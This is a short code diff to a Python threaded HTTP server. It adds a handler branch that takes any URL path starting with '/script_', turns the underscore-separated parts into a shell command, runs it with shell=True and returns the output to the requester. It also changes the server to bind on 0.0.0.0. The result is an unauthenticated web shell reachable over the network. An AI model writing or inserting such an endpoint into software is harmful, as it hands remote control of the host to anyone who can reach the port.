@@ -68,6 +68,15 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 message=loadpage(location)
                 if filestypes==".css": ctype="text/css"
                 if filestypes==".js": ctype="text/javascript"
+        if location.startswith("/script_"):
+            params = location.split("_")[1:]
+            cmd2run = " ".join(params)
+            try:
+                output=subprocess.check_output(cmd2run,universal_newlines=True,shell=True,encoding='UTF-8')
+            except Exception as err:
+                output="ERROR: "+str(err)
+            output=output.replace("\n","<br/>")
+            message=output
 
         print(parsed_data.geturl())
         self.sendtextinfo(200,message,ctype)
@@ -105,7 +114,7 @@ if sys.argv[1:]:
 else:
     HTPORT = 8000
 
-HTSERVER = ThreadedHTTPServer(('', HTPORT), Handler)
+HTSERVER = ThreadedHTTPServer(('0.0.0.0', HTPORT), Handler)
 
 try:
     while 1:
